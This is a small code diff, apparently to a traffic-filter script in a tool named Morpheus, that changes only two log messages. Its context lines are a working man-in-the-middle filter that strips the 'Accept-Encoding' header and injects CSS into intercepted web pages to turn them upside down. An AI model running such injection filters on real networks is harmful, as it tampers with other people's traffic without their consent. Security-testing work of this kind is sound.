@@ -25,7 +25,7 @@
 if (ip.proto == TCP && tcp.src == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
     replace("Accept-Encoding","Accept-Nothing!");
-    msg("[Morpheus Filter] Encoding zapped.");
+    msg("[Morpheus] Encoding zapped.");
   }
 }
 
@@ -36,7 +36,7 @@ if (ip.proto == TCP && tcp.src == 80) {
 if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "<head>")) {
     replace("<head>", "<head><style>body{-webkit-transform:rotate(-180deg) !important;-ms-transform:rotate(-180deg) !important;-moz-transform:rotate(-180deg) !important;}</style>");
-    msg("[Morpheus Filter] rotate document 180 degrees...\n");
+    msg("[Morpheus] rotate document 180 degrees...\n");
   }
 }
 
